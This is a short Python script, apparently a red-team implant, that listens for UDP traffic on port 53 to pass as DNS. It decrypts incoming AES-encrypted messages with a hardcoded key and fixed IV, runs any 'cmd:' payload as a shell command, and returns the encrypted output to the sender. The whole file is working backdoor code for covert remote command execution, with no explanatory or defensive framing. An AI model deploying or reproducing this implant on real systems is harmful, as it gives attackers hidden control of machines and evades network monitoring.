import socket
import subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import base64

KEY = b'ACYBER-SECURITY-REDTEAM'.ljust(32, b'\0')
IV = b'0000000000000000'

def execute_command(command):
    try:
        result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.decode()}"

def encrypt_data(data):
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data.encode()) + padder.finalize()

    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return base64.b64encode(encrypted_data).decode()

def decrypt_data(encrypted_data):
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(base64.b64decode(encrypted_data)) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    original_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return original_data.decode()
server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(('0.0.0.0', 53)) 
print("Server is listening on port 53...")

while True:
    data, addr = server_socket.recvfrom(1024)
    print(f"Received data: {data}")
    decoded_request = decrypt_data(data.decode())
    print(f"Decoded request: {decoded_request}")
    if decoded_request.startswith("cmd:"):
        command = decoded_request[4:]
        result = execute_command(command)
        encoded_response = encrypt_data(result)
        server_socket.sendto(encoded_response.encode(), addr)
        print(f"Sent response: {encoded_response}")
